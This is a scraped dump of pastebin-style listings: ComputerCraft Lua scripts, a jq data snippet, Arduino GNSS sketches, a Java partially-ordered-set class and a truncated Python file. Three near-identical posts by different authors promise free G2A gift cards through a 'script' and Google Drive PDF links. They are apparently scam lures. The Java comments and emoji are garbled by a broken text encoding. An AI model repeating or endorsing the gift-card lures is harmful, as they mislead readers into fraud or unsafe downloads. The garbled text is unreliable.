q6VwwaqW,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,PetrikDev,JavaScript,Monday 24th of June 2024 06:18:29 PM CDT,"G2A.com complimentary gift card & gaming guide.
Any voucher for free on G2A.com including Steam gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24 2024

"
P4bnFYny,PureDaisy,Leander,Lua,Monday 24th of June 2024 06:14:16 PM CDT,"local inputChest = peripheral.wrap(""top"")
local outputChest = peripheral.wrap(""bottom"")
local activeRing = 1
local originBlock = nil

local function main()
	while true do
		ClearInventory()
		GetBlocks()

		if turtle.getItemCount(1) < 16 then
			return 0
		end

		turtle.forward()
		PlaceRing()
		SwitchRing()
		PlaceRing()
		SwitchRing()

		local _, data = turtle.inspectDown()
		while data.name == originBlock do
			sleep(1)
			_, data = turtle.inspectDown()
		end

		MineRing()
		SwitchRing()
		MineRing()
		SwitchRing()

		turtle.back()
	end
end

function ClearInventory()
	for i = 1, 16 do
		turtle.select(i)
		turtle.dropDown()
	end
	turtle.select(1)
end

function GetBlocks()
	turtle.select(1)
	turtle.suckUp(16)
	if turtle.getItemCount(1) > 0 then
		originBlock = turtle.getItemDetail(1).name
	else
		originBlock = ""N/A""
	end
	print(""Origin block: "" .. originBlock)
end

function PlaceRing()
	for i = 1, 4 do
		for j = 1, 3 do
			turtle.placeDown()
			if j < 3 then
				turtle.forward()
			end
		end
		turtle.turnRight()
	end
end

function MineRing()
	for i = 1, 4 do
		for j = 1, 3 do
			turtle.digDown()
			if j < 3 then
				turtle.forward()
			end
		end
		turtle.turnRight()
	end
end

function MinePlaceRing()
	for i = 1, 4 do
		for j = 1, 3 do
			turtle.placeDown()
			turtle.digDown()
			if j < 3 then
				turtle.forward()
			end
		end
		turtle.turnRight()
	end
end

function SwitchRing()
	for i = 1, 4 do
		if activeRing == 1 then
			turtle.forward()
		elseif activeRing == 2 then
			turtle.back()
		else
			print(""Active ring unknown: "" .. activeRing)
			return
		end
	end

	if activeRing == 1 then
		activeRing = 2
	elseif activeRing == 2 then
		activeRing = 1
	else
		activeRing = -1
	end
end

local returnCode = main()
print(""Program exited with code: "" .. returnCode)"
vnBMEKJ2,Parsing User JSON Data to CSV,metalx1000,Bash,Monday 24th of June 2024 05:55:33 PM CDT,"wget -qO- ""https://randomuser.me/api/?nat=us&results=100&format=csv""  > users.csv
csv2json -i users.csv -o users.json -f pretty
jq -r '.[]|(.phone+"",""+.email+"",""+.""dob.age"")' users.json
jq -r '.[]|(.phone+""|""+.email+""|""+.""dob.age"")' users.json

jq -r '.[]|(.""name.first""+"",""+.""name.last""+"",""+.""dob.age""+"",""+.phone)' users.json
jq -r '.[]|""\(.""name.first""),\(.""name.last""),\(.""dob.age""), \(.phone)""' users.json"
C4Nta49i,Elev Control Tablet,itsjstn,Lua,Monday 24th of June 2024 05:26:00 PM CDT,"local utils = require 'itsjstnutils'
local w, h = term.getSize()

local buttons = {}

local function showButtons()
    utils.terminal.resetTerminal(""Elevator Controls"", nil)
    utils.pages.drawButtons(buttons, {})
end

local function showError()
    utils.terminal.resetTerminal(""Elevator Controls"", ""Error"")
    utils.terminal.safeWrite(""Failed to communicate the specified command."", colors.red, true, true)

    sleep(3)
    showButtons()
end

local function showSuccess(message)
    utils.terminal.resetTerminal(""Elevator Controls"", ""Success"")
    utils.terminal.safeWrite(message, colors.green, true, true)

    sleep(3)
    showButtons()
end

buttons = {
    utils.types.PageButton(
        ""raise"",
        true,
        ""Raise Lift"",
        nil,
        (h / 2) - 1,
        true,
        colors.blue,
        function()
            local target = rednet.lookup(""elev_op"", ""server"")
            local response = utils.rednet.sendRednetRequest(target, {
                type = ""raise""
            }, ""elev_op"", 10)
            
            if response.success then
                showSuccess(""The elevator is now rising."")
            else
                showError()
            end
        end
    ),
    utils.types.PageButton(
        ""lower"",
        true,
        ""Lower Lift"",
        nil,
        (h / 2) + 1,
        true,
        colors.red,
        function()
            local target = rednet.lookup(""elev_op"", ""server"")
            local response = utils.rednet.sendRednetRequest(target, {
                type = ""lower""
            }, ""elev_op"", 10)
            
            if response.success then
                showSuccess(""The elevator is now lowering."")
            else
                showError()
            end
        end
    )
}

peripheral.find(""modem"", rednet.open)

showButtons()
while true do
    local event, button, x, y = os.pullEvent(""mouse_click"")
    for i, v in ipairs(buttons) do
        local pos = v.getPosition()
        if pos.y == y and pos.startX <= x and pos.endX >= x then
            v.onClick()
        end
    end
end"
NSH1yqRp,Elev Control PC,itsjstn,Lua,Monday 24th of June 2024 05:15:30 PM CDT,"local utils = require 'itsjstnutils'

local commands = {
    {
        type = ""raise"",
        handler = function(sender, req)
            redstone.setOutput(""top"", true)
            rednet.send(sender, {
                success = true
            }, ""elev_op"")
        end
    },
    {
        type = ""lower"",
        handler = function(sender, req)
            redstone.setOutput(""top"", false)
            rednet.send(sender, {
                success = true
            }, ""elev_op"")
        end
    }
}

rednet.open('back')
if rednet.isOpen('back') then
    rednet.host(""elev_op"", ""server"")

    while true do
        print(""Waiting for command..."")
        local sender, req = rednet.receive(""elev_op"");
        print(""Command received: "" .. req.type)
        for i, v in ipairs(commands) do
            if v.type == req.type then
                v.handler(sender, req.body)
            end
        end
    end
else
    print('Failed to activate the attached modem.')
end"
4X9KpGTC,üéÅ G2A.COM FREE GIFT CARD GUIDE JUN 2024 V2 üéÅ,ssss50ws,GetText,Monday 24th of June 2024 04:52:01 PM CDT,"G2A.com free gift card & games updated guide
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
25 June 2024"
DXLedF3R,"""Activate GNSS"" rev_66",pleasedontcode,Arduino,Monday 24th of June 2024 04:37:19 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Activate GNSS""
	- Source Code compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-06-24 21:35:54

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Use TinyGSM library to initialize modem with APN */
	/* ""airtelgprs.com"", establish GSM connection, enable */
	/* GNSS module for location data capture, and display */
	/* all activity logs on Serial Monitor. */
/****** SYSTEM REQUIREMENT 2 *****/
	/* add #define TINY_GSM_MODEM_SIM7600 */
/****** END SYSTEM REQUIREMENTS *****/


/********* User code review feedback **********
#### Feedback 1 ####
- do nothing
********* User code review feedback **********/
/****** DEFINITION OF LIBRARIES *****/
#define TINY_GSM_MODEM_SIM7600  // Define GSM modem model before including the library
#include <TinyGsmClient.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF Hardware Serial *****/
#define SerialMon Serial
#define MODEM_RST 5
#define MODEM_PWRKEY 4
#define MODEM_POWER_ON 23
#define MODEM_TX 27
#define MODEM_RX 26
#define I2C_SDA 21
#define I2C_SCL 22

/***** SYSTEM REQUIREMENT 1 *****/
#define TINY_GSM_DEBUG SerialMon

// Your GPRS credentials
const char apn[] = ""airtelgprs.com"";
const char gprsUser[] = """";
const char gprsPass[] = """";

// Initialize the TinyGSM modem instance
TinyGsm modem(Serial2);
TinyGsmClient client(modem);

void setup(void)
{
    // Set console baud rate
    SerialMon.begin(115200);
    delay(10);

    // Set GSM module baud rate
    Serial2.begin(115200, SERIAL_8N1, MODEM_RX, MODEM_TX);
    delay(3000);

    // Restart takes quite some time
    // To skip it, call init() instead of restart()
    SerialMon.println(""Initializing modem..."");
    modem.restart();

    // Display modem info
    String modemInfo = modem.getModemInfo();
    SerialMon.print(""Modem Info: "");
    SerialMon.println(modemInfo);

    // Unlock your SIM card with a PIN if needed
    // modem.simUnlock(""1234"");

    // Connect to the GPRS network
    SerialMon.print(""Connecting to APN: "");
    SerialMon.println(apn);
    if (!modem.gprsConnect(apn, gprsUser, gprsPass)) {
        SerialMon.println(""Failed to connect to GPRS"");
        while (true);
    }
    SerialMon.println(""GPRS connected"");

    // Enable GNSS
    SerialMon.println(""Enabling GNSS..."");
    modem.enableGPS();
}

void loop(void)
{
    // Check if GNSS is enabled and get location data
    float lat, lon;
    if (modem.getGPS(&lat, &lon)) {
        SerialMon.print(""Latitude: "");
        SerialMon.println(lat, 6);
        SerialMon.print(""Longitude: "");
        SerialMon.println(lon, 6);
    } else {
        SerialMon.println(""Failed to get GPS data or GNSS is not enabled"");
    }

    delay(10000); // Wait for 10 seconds before the next loop
}

/* END CODE */"
amxC77Vm,"""Activate GNSS"" rev_65",pleasedontcode,Arduino,Monday 24th of June 2024 04:35:26 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Activate GNSS""
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-06-24 21:35:04

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Use TinyGSM library to initialize modem with APN */
	/* ""airtelgprs.com"", establish GSM connection, enable */
	/* GNSS module for location data capture, and display */
	/* all activity logs on Serial Monitor. */
/****** SYSTEM REQUIREMENT 2 *****/
	/* add #define TINY_GSM_MODEM_SIM7600 */
/****** END SYSTEM REQUIREMENTS *****/


/********* User code review feedback **********
#### Feedback 1 ####
- do nothing
********* User code review feedback **********/

/****** DEFINITION OF LIBRARIES *****/
#include <TinyGsmClient.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF Hardware Serial *****/
#define modem Serial2 // TX_PIN: D17, RX_PIN: D16

/***** SYSTEM REQUIREMENT 2 *****/
#define TINY_GSM_MODEM_SIM7600

/***** SYSTEM REQUIREMENT 1 *****/
#define TINY_GSM_DEBUG Serial

// Your GPRS credentials
const char apn[] = ""airtelgprs.com"";
const char gprsUser[] = """";
const char gprsPass[] = """";

// Initialize the TinyGSM modem instance
TinyGsm modem(modem);
TinyGsmClient client(modem);

void setup(void)
{
    // Set console baud rate
    Serial.begin(115200);
    delay(10);

    // Set GSM module baud rate
    modem.begin(115200);

    // Restart takes quite some time
    // To skip it, call init() instead of restart()
    Serial.println(""Initializing modem..."");
    modem.restart();

    // Display modem info
    String modemInfo = modem.getModemInfo();
    Serial.print(""Modem Info: "");
    Serial.println(modemInfo);

    // Unlock your SIM card with a PIN if needed
    // modem.simUnlock(""1234"");

    // Connect to the GPRS network
    Serial.print(""Connecting to APN: "");
    Serial.println(apn);
    if (!modem.gprsConnect(apn, gprsUser, gprsPass)) {
        Serial.println(""Failed to connect to GPRS"");
        while (true);
    }
    Serial.println(""GPRS connected"");

    // Enable GNSS
    Serial.println(""Enabling GNSS..."");
    modem.enableGPS();
}

void loop(void)
{
    // Check if GNSS is enabled and get location data
    if (modem.isGPS()) {
        float lat, lon;
        if (modem.getGPS(&lat, &lon)) {
            Serial.print(""Latitude: "");
            Serial.println(lat, 6);
            Serial.print(""Longitude: "");
            Serial.println(lon, 6);
        } else {
            Serial.println(""Failed to get GPS data"");
        }
    } else {
        Serial.println(""GNSS is not enabled"");
    }

    delay(10000); // Wait for 10 seconds before the next loop
}

/* END CODE */"
LGGLZM4p,üéÅ G2A.COM FREE GIFT CARD GUIDE JUN 2024 V2 üéÅ,wwxcwx,GetText,Monday 24th of June 2024 04:16:29 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
24 June 2024"
U62F1QGV,PartiallyOrderedSet,Tochoz,Java,Monday 24th of June 2024 04:14:19 PM CDT,"public class PartiallyOrderedSet {
    public static class Data{ // –ö–ª–∞—Å—Å –æ–±—ä–µ–∫—Ç–∞ –∫–æ—Ç–æ—Ä—ã–π —ç—Ä–∞–Ω–∏—Ç –¥–∞–Ω–Ω—ã–µ –æ —É–ø–æ—Ä—è–¥–æ—á–µ–Ω–Ω—ã—Ö –ø–∞—Ä–∞—Ö
        private int a[], b[]; // –ú–∞—Å—Å–∏–≤—ã –ø–µ—Ä–≤—ã—Ö –∏ –≤—Ç–æ—Ä—ã—Ö —á–∏—Å–µ–ª –≤ –ø–∞—Ä–∞—Ö

        public Data(int[] a, int[] b){
            this.a = a;
            this.b = b;
        }
    }
    private class FollowerItem{ // –ö–ª–∞—Å—Å —ç–ª–µ–º–µ–Ω—Ç–∞ —Å–≤—è–∑–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞ —É–∫–∞–∑–∞—Ç–µ–ª–µ–π –Ω–∞ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª–µ–π
        FollowerItem follower;
        FollowerItem next;


        // –ö–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä –∑–∞–ø–∏—Å—ã–≤–∞—é—â–∏–π —É–∫–∞–∑–∞—Ç–µ–ª–∏ –Ω–∞ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—è –∏ –Ω–∞ —Å–ª–µ–¥—É—é—â–∏–π
        public FollowerItem(FollowerItem item, FollowerItem next){
            this.next = next;
            follower = item;
        }

        public FollowerItem(){
            follower = null;
            next = null;
        }
    }

    private class Item extends FollowerItem{ // –ö–ª–∞—Å—Å —ç–ª–µ–º–µ–Ω—Ç–∞ —Å–≤—è–∑–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞ —á–∏—Å–µ–ª –ø—Ä–∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏
        int pred_count; // –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–µ–¥—à–µ—Å—Ç–≤–µ–Ω–Ω–∏–∫–æ–≤
        int val; // –ó–Ω–∞—á–µ–Ω–∏–µ —ç–ª–µ–º–µ–Ω—Ç–∞ –º–Ω–æ–∂–µ—Å—Ç–≤–∞

        public Item(int value){
            pred_count = 0;
            val = value;
        }
    }
    private Item head;

    // –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∏—Å—Ç–∏–Ω—É –µ—Å–ª–∏ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–æ–ª–Ω–∏—Ç—å –º–Ω–æ–∂–µ—Å—Ç–≤–æ –∑–Ω–∞—á–µ–Ω–∏—è–º–∏, –∏–Ω–∞—á–µ –ª–æ–∂—å
    public boolean INIT(Data pairs){ // –º–µ—Ç–æ–¥ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç –º–Ω–æ–∂–µ—Å—Ç–≤–æ –Ω–∞–±–æ—Ä–æ–º –ø–∞—Ä, –¥–ª–∏–Ω—ã –¥–≤—É—Ö –º–∞—Å—Å–∏–≤–æ–≤ –≤ –Ω–∞–±–æ—Ä–µ –¥–æ–ª–∂–Ω—ã —Å–æ–≤–ø–∞–¥–∞—Ç—å
        if (pairs == null || pairs.a == null || pairs.b == null) return false; // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –∑–Ω–∞—á–µ–Ω–∏–π

        int a = pairs.a[0],b = pairs.b[0]; // –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –ø–µ—Ä–≤–æ–π –ø–∞—Ä—ã
        if (a==b) return false; // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –∞–Ω—Ç–∏—Ä–µ—Ñ–ª–µ–∫—Å–∏–≤–Ω–æ—Å—Ç—å
        head = new Item(a); // –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø–µ—Ä–≤–æ–≥–æ —á–∏—Å–ª–∞ –≤ –≥–æ–ª–æ–≤—É
        head.next = new Item(b); // –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤—Ç–æ—Ä–æ–≥–æ —á–∏—Å–ª–∞ –ø–æ—Å–ª–µ –≥–æ–ª–æ–≤—ã
        head.follower = new FollowerItem(head.next, null); // –î–æ–±–∞–≤–ª–µ–Ω–∏–µ —ç–ª–µ–º–µ–Ω—Ç–∞ –≤ —Å–ø–∏—Å–æ–∫ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª–µ–π —Å —Å—Å—ã–ª–∫–æ–π –Ω–∞ –≤—Ç–æ—Ä–æ–µ —á–∏—Å–ª–æ
        ((Item)head.next).pred_count = 1; // –£–≤–µ–ª–∏—á–µ–Ω–∏–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –ø—Ä–µ–¥—à–µ—Å—Ç–≤–µ–Ω–Ω–∏–∫–æ–≤ —É –≤—Ç–æ—Ä–æ–≥–æ —á–∏—Å–ª–∞ –¥–æ –æ–¥–Ω–æ–≥–æ

        for (int i=1; i< pairs.a.length; i++){ // –ü—Ä–æ—Ö–æ–¥ –ø–æ –ø–∞—Ä–∞–º –∑–Ω–∞—á–µ–Ω–∏–π
            a = pairs.a[i]; b = pairs.b[i]; // –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –ø–∞—Ä—ã

            if (a==b) return false; // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –∞–Ω—Ç–∏—Ä–µ—Ñ–ª–µ–∫—Å–∏–≤–Ω–æ—Å—Ç—å

            Item first, second;  // –°—Å—ã–ª–∫–∏ –Ω–∞ —ç–ª–µ–º–µ–Ω—Ç—ã —Å–ø–∏—Å–∫–∞ —Å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–º–∏ —á–∏—Å–ª–∞–º–∏

            first = find(a); // –ü–æ–∏—Å–∫ –≤ —Å–≤—è–∑–Ω–æ–º —Å–ø–∏—Å–∫–µ
            if (first.val != a) { // –ï—Å–ª–∏ –≤–µ—Ä–Ω—É–ª–∏ –Ω–µ —Å–æ–≤–ø–∞–¥–∞—é—â–∏–π —ç–ª–µ–º–µ–Ω—Ç —Ç–æ —Ç–∞–∫–æ–≥–æ –≤ —Å–ø–∏—Å–∫–µ –Ω–µ—Ç, –Ω–∞–º –≤–µ—Ä–Ω—É–ª–∏ —Å—Å—ã–ª–∫—É –Ω–∞ –∫–æ–Ω–µ—Ü, —Å–æ–∑–¥–∞—ë–º —ç–ª–µ–º–µ–Ω—Ç
                first.next = new Item(a);
                first = (Item)first.next;
            }

            second = find(b); // –ü–æ–∏—Å–∫ –≤ —Å–≤—è–∑–Ω–æ–º —Å–ø–∏—Å–∫–µ

            if (second.val != b) { // –ï—Å–ª–∏ –≤–µ—Ä–Ω—É–ª–∏ –Ω–µ —Å–æ–≤–ø–∞–¥–∞—é—â–∏–π —ç–ª–µ–º–µ–Ω—Ç —Ç–æ —Ç–∞–∫–æ–≥–æ –≤ —Å–ø–∏—Å–∫–µ –Ω–µ—Ç, –Ω–∞–º –≤–µ—Ä–Ω—É–ª–∏ —Å—Å—ã–ª–∫—É –Ω–∞ –∫–æ–Ω–µ—Ü, —Å–æ–∑–¥–∞—ë–º —ç–ª–µ–º–µ–Ω—Ç
                second.next = new Item(b);
                second = (Item)second.next;
            }

            // –í—Å—Ç–∞–≤–∫–∞ –≤ —Å–ø–∏—Å–æ–∫ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª–µ–π –ø–µ—Ä–≤–æ–≥–æ —Å—Å—ã–ª–∫—É –Ω–∞ –≤—Ç–æ—Ä–æ–µ —á–∏—Å–ª–æ
            first.follower = new FollowerItem(second, first.follower);
            second.pred_count++; // –£–≤–µ–ª–∏—á–µ–Ω–∏–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –ø—Ä–µ–¥—à–µ—Å—Ç–≤–µ–Ω–Ω–∏–∫–æ–≤ —É –≤—Ç–æ—Ä–æ–≥–æ —á–∏—Å–ª–∞ –Ω–∞ 1
        }
        return true;
    }

    private Item find(int value) { // –º–µ—Ç–æ–¥ –∏—â–µ—Ç –≤ –Ω–µ–ø—É—Å—Ç–æ–º —Å–ø–∏—Å–∫–µ —ç–ª–µ–º–µ–Ω—Ç —Å –∑–∞–¥–∞–Ω–Ω—ã–º –∑–Ω–∞—á–µ–Ω–∏–µ–º, –µ—Å–ª–∏ —Ç–∞–∫–æ–≥–æ –Ω–µ—Ç, –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –ø–æ—Å–ª–µ–¥–Ω–∏–π —ç–ª–µ–º–µ–Ω—Ç
        Item p = head;
        while (p.next != null){ // –ø—Ä–æ—Ö–æ–¥ –¥–æ –∫–æ–Ω—Ü–∞ —Å–ø–∏—Å–∫–∞
            if (p.val == value) return p; // –µ—Å–ª–∏ –Ω–∞—à–ª–∏ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º —ç–ª–µ–º–µ–Ω—Ç
            p = (Item) p.next; // –ü—Ä–∏–≤–æ–¥–∏–º —Ç–∏–ø –∫ Item
        }
        return p; // –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–π —ç–ª–µ–º–µ–Ω—Ç —Å–ø–∏—Å–∫–∞

    }

    public boolean SORT(){ // –ú–µ—Ç–æ–¥ —Å–æ—Ä—Ç–∏—Ä—É–µ—Ç –º–Ω–æ–∂–µ—Å—Ç–≤–æ –ø–æ –∑–∞–¥–∞–Ω–Ω—ã–º –ø—Ä–∞–≤–∏–ª–∞–º, –µ—Å–ª–∏ —É—Å–ø–µ—à–Ω–æ, –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∏—Å—Ç–∏–Ω—É
        // –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ —Å–≤—è–∑–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–æ —É–ø–æ—Ä—è–¥–æ—á–µ–Ω—ã—Ö —ç–ª–µ–º–µ–Ω—Ç–æ–≤
        Item res = new Item(0); // –° –≤—Ä–µ–º–µ–Ω–Ω–æ–π –≥–æ–ª–æ–≤–æ–π
        Item r = res; // –£–∫–∞–∑–∞—Ç–µ–ª—å –ø–æ —Ä–µ–∑—É–ª—å—Ç–∏—Ä—É—é—â–µ–º—É —Å–ø–∏—Å–∫—É

        while (head != null){
            FollowerItem followerHead; // –ì–æ–ª–æ–≤–∞ —Å–ø–∏—Å–∫–∞ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è –Ω–∞–π–¥–µ–Ω–Ω–æ–≥–æ —Å–ª–µ–¥—É—é—â–µ–≥–æ —ç–ª–µ–º–µ–Ω—Ç–∞
            if (head.pred_count == 0){ // –ï—Å–ª–∏ –≤ –≥–æ–ª–æ–≤–µ —ç–ª–µ–º–µ–Ω—Ç —Å –Ω—É–ª—ë–º –ø—Ä–µ–¥—à–µ—Å—Ç–≤–µ–Ω–Ω–∏–∫–æ–≤, –∑–∞–ø–æ–º–∏–Ω–∞–µ–º –µ–≥–æ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª–µ–π –∏ —É–¥–∞–ª—è–µ–º –≥–æ–ª–æ–≤—É
                followerHead = head.follower;

                 r.next = new Item(head.val); // –î–æ–±–∞–≤–ª—è–µ–º —á–∏—Å–ª–æ –≤ –∫–æ–Ω–µ—Ü —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞
                 r = (Item) r.next;

                head = (Item) head.next; // –£–¥–∞–ª—è–µ–º –≥–æ–ª–æ–≤—É
            }
            else { // –ò–Ω–∞—á–µ –∏—â–µ–º –≤ —Å–ø–∏—Å–∫–µ —Ç–∞–∫–æ–π —ç–ª–µ–º–µ–Ω—Ç
                Item prev = findPrevZero(), item;
                if (prev == null) return false; // –ï—Å–ª–∏ –Ω–µ—Ç —Ç–∞–∫–∏—Ö —ç–ª–µ–º–µ–Ω—Ç–æ–≤, –º–Ω–æ–∂–µ—Å—Ç–≤–æ –Ω–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç —É—Å–ª–æ–≤–∏–µ

                item = (Item) prev.next; // –°—Å—ã–ª–∫–∞ –Ω–∞ –∏—Å–∫–æ–º—ã–π —ç–ª–µ–º–µ–Ω—Ç
                followerHead = item.follower; // –ó–∞–ø–æ–º–∏–Ω–∞–µ–º –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª–µ–π

                r.next = new Item(item.val); // –î–æ–±–∞–≤–ª—è–µ–º —á–∏—Å–ª–æ –≤ –∫–æ–Ω–µ—Ü —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞
                r = (Item) r.next;

                prev.next = item.next; // –£–¥–∞–ª—è–µ–º —ç–ª–µ–º–µ–Ω—Ç –∏–∑ —Å–≤—è–∑–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞
            }

            // –£–º–µ–Ω—å—à–∞–µ–º –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—è –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–µ–¥—à–µ—Å—Ç–≤–µ–Ω–Ω–∏–∫–æ–≤ –Ω–∞ 1
            lowerFollowers(followerHead);

        }
        head = (Item) res.next; // –ó–∞–º–µ–Ω—è–µ–º —Å–ø–∏—Å–æ–∫ –Ω–∞ –æ—Ç—Å–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π, –æ–±—Ö–æ–¥—è –≤—Ä–µ–º–µ–Ω–Ω—É—é –≥–æ–ª–æ–≤—É
        return true;


    }

    // –ú–µ—Ç–æ–¥ –ø—Ä–æ—Ö–æ–¥–∏—Ç –ø–æ —Å–ø–∏—Å–∫—É –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª–µ–π –∏ —É–º–µ–Ω—å—à–∞–µ—Ç –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–µ–¥—à–µ—Å—Ç–≤–µ–Ω–Ω–∏–∫–æ–≤, –Ω–∞ –≤—Ö–æ–¥ –ø–æ–ª—É—á–∞–µ—Ç –≥–æ–ª–æ–≤—É —Å–ø–∏—Å–∫–∞
    private void lowerFollowers(FollowerItem follower){
        while (follower != null){
            Item item = (Item) follower.follower; // –ü–æ—Å–ª–µ–¥—É—é—â–∏–π —ç–ª–µ–º–µ–Ω—Ç –ø–æ—Å–ª–µ –Ω–∞–π–¥–µ–Ω–Ω–æ–≥–æ
            item.pred_count--; // –£–º–µ–Ω—å—à–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–µ–¥—à–µ—Å—Ç–≤–µ–Ω–Ω–∏–∫–æ–≤

            follower = follower.next; // –ò–¥—ë–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—é
        }
    }

    // –ú–µ—Ç–æ–¥ –Ω–∞—Ö–æ–¥–∏—Ç –≤ —Å–ø–∏—Å–∫–µ —ç–ª–µ–º–µ–Ω—Ç —Å –Ω—É–ª—ë–º –ø—Ä–µ–¥—à–µ—Å—Ç–≤–µ–Ω–Ω–∏–∫–æ–≤, –µ—Å–ª–∏ —ç—Ç–æ –Ω–µ –≥–æ–ª–æ–≤–∞, –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –ø—Ä–µ–¥—ã–¥—É—â–∏–π –µ–º—É
    private Item findPrevZero(){
        Item fir = head, sec = (Item) head.next; // 2 —É–∫–∞–∑–∞—Ç–µ–ª—è —Å–ª–µ–¥—É—é—â–∏–µ –¥—Ä—É–≥ –∑–∞ –¥—Ä—É–≥–æ–º

        while (sec != null){ // –ü—Ä–æ—Ö–æ–¥ –ø–æ —Å–≤—è–∑–Ω–æ–º—É —Å–ø–∏—Å–∫—É
            if (sec.pred_count == 0)  // –µ—Å–ª–∏ –Ω–∞—à–ª–∏ —ç–ª–µ–º–µ–Ω—Ç —Å –Ω—É–ª—ë–º –ø—Ä–µ–¥—à–µ—Å—Ç–≤–µ–Ω–Ω–∏–∫–æ–≤ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –ø—Ä–µ–¥—ã–¥—É—â–∏–π
                return fir;

            // –ò–¥—ë–º –¥–∞–ª—å—à–µ
            fir = sec;
            sec = (Item) sec.next;
        }
        return null; // –µ—Å–ª–∏ –¥–æ—à–ª–∏ –¥–æ –∫–æ–Ω—Ü–∞, –≤–µ—Ä–Ω—É–ª–∏ null
    }

    public void print(){ // –í—ã–≤–æ–¥ —Å–ø–∏—Å–∫–∞ —ç–ª–µ–º–µ–Ω—Ç–æ–≤
        for(Item p=head; p != null; p = (Item) p.next)
            System.out.print(p.val + "" "");
        System.out.println();
    }
}
"
S2S8dAg5,Untitled,em1tao,Python,Monday 24th of June 2024 03:53:53 PM CDT,"# session_factory.py
from collections.abc import AsyncGenerator

from sqlalchemy.ext.asyncio import (
    AsyncSession,
    async_sessionmaker,
